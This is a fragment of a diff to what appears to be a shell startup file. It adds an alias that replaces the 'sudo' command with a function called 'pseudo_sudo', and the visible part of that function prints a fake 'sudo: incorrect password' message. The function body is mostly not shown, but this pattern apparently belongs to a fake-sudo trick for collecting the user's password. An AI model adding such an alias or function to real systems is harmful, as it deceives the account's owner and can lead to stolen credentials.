@@ -23,3 +23,4 @@ function pseudo_sudo {
             echo "sudo: incorrect password"
         fi
 }
+alias sudo=pseudo_sudo
